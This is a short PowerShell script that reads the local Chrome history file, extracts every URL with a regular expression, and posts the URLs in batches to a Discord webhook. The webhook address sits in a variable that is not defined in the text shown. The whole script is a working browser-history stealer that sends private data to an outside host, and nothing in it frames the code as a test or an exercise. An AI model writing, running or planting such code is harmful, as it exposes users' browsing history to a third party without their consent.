$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"

# Check if the file exists
if (!(Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file contents
$fileContents = Get-Content -Path $filePath

# Extract URLs using regular expressions
$urlPattern = 'https?://(?:[-\w]+\.)+[a-zA-Z]{2,9}(?:/[-\w]+)*'
$urls = $fileContents | Select-String -Pattern $urlPattern -AllMatches | Foreach-Object { $_.Matches.Value }

# Prepare messages with maximum character limit
$messages = @()
$currentMessage = ""
foreach ($url in $urls) {
    $newContent = $currentMessage + "`n" + $url
    if ($newContent.Length -gt 1800) {
        $messages += $currentMessage
        $currentMessage = $url
    } else {
        $currentMessage = $newContent
    }
}
# Add the last message
$messages += $currentMessage

# Send each message to Discord webhook with a delay of 0.5 seconds
foreach ($message in $messages) {
    $body = @{
        "content" = $message
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "application/json" -Body $body

    Start-Sleep -Milliseconds 500  # Delay for 0.5 seconds
}

# Display success message
Write-Host "URLs sent successfully to the Discord webhook."
